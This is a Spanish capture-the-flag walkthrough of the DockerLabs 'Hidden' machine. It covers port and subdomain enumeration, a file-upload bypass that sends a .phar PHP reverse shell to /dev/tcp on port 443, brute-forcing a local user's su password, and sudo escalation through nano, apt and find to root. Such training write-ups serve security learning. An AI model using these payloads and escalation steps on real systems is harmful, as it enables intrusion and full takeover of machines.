#MAQUINA #DOCKERLABS #MEDIO
#SUBDOMAINS #ABUSO_SUBIDA_ARCHIVOS 
#SU_BRUTE_FORCE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Hidden** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 10:05 CET
Initiating ARP Ping Scan at 10:05
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:05, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:05
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:05, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-21 10:05:46 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)




```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 10:06 CET
Nmap scan report for hidden.lab (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: HIDDEN - Tu Tienda de Caf\xC3\xA9s
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: localhost

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds


```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 10:06 CET
Nmap scan report for hidden.lab (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /mail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
|_  /lib/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

Usando **gobuster** e inspeccionando todo no encuentro nada. Vamos a enumerar subdominios.

```bash
gobuster vhost -u hidden.lab -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 --append-domain | grep "Status: 200" 
Found: dev.hidden.lab Status: 200 [Size: 1653]
Progress: 114441 / 114442 (100.00%) 
```

```
wfuzz -u "http://hidden.lab" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.hidden.lab" --hc=302
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hidden.lab/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000019:   200        57 L     130 W      1653 Ch     "dev"                                                                                                                    
000009532:   400        10 L     35 W       301 Ch      "#www"                                                                                                                   
000010581:   400        10 L     35 W       301 Ch      "#mail"                                                                                                                  
000047706:   400        10 L     35 W       301 Ch      "#smtp"                                                                                                                  
000103135:   400        10 L     35 W       301 Ch      "#pop3"                                                                                                                  

Total time: 0
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 0

```

Tenemos **dev.hidden.lab**

## dev.hidden.lab (80)

Usamos **gobuster** para enumerar:

```bash
gobuster dir -u http://dev.hidden.lab/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.hidden.lab/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,jpg,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 1653]
/uploads              (Status: 301) [Size: 318] [--> http://dev.hidden.lab/uploads/]
/upload.php           (Status: 200) [Size: 74]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished

```

Tenemos un **upload.php** y un **uploads**
# EXPLOTACION

Al subir un **php** para al ponernos en escucha por el puerto 443 otorgarnos una reverse shell no nos deja, pero si interceptamos con burpsuite y cambiamos la extension a **.phar** si :

```python
POST /upload.php HTTP/1.1
Host: dev.hidden.lab
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------21765136792949585244347782969
Content-Length: 477
Origin: http://dev.hidden.lab
Connection: keep-alive
Referer: http://dev.hidden.lab/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------21765136792949585244347782969
Content-Disposition: form-data; name="archivo"; filename="wp.phar"
Content-Type: application/x-php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------21765136792949585244347782969--

```
# ESCALADA PRIVILEGIOS

Vemos los usuarios y tenemos a **cafetero , bobby y john**.

Tras un rato, no veo forma de escalar, voy a hacer fuerza bruta con cafetero.

Nos descargamos : https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.py y subimos el programa por el upload.php y el diccionario igual (uno no muy grande) :

```bash
www-data@bc070f92e382:/var/www/dev.hidden.lab/uploads$ ./Linux-Su-Force.sh cafetero 500-worst-passwords.txt 
Contraseña encontrada para el usuario cafetero: 123123

```

**Usuario -> cafetero**
**Contra -> 123123**

YA ESTAMOS COMO CAFETERO.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
cafetero@bc070f92e382:/var/www/dev.hidden.lab/uploads$ sudo -l
Matching Defaults entries for cafetero on bc070f92e382:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cafetero may run the following commands on bc070f92e382:
    (john) NOPASSWD: /usr/bin/nano


```

Vemos **nano** con permisos SUDO:

   ```bash
sudo -u john nano
^R^X
reset; sh 1>&0 2>&0
```

YA ESTAMOS COMO JOHN.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
john@bc070f92e382:/var/www/dev.hidden.lab/uploads$ sudo -l
Matching Defaults entries for john on bc070f92e382:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User john may run the following commands on bc070f92e382:
    (bobby) NOPASSWD: /usr/bin/apt


```

Vemos **apt** con permisos SUDO:

   ```bash
sudo -u bobby apt changelog apt
!/bin/sh
```

YA ESTAMOS COMO BOBBY.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
bobby@bc070f92e382:/var/www/dev.hidden.lab/uploads$ sudo -l
Matching Defaults entries for bobby on bc070f92e382:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on bc070f92e382:
    (root) NOPASSWD: /usr/bin/find

```

Vemos **find** con permisos SUDO:

   ```bash
bobby@bc070f92e382:/var/www/dev.hidden.lab/uploads$ 

    sudo find . -exec /bin/sh \; -quit

# whoami
root
# 
```

**YA ESTAMOS COMO ROOT.**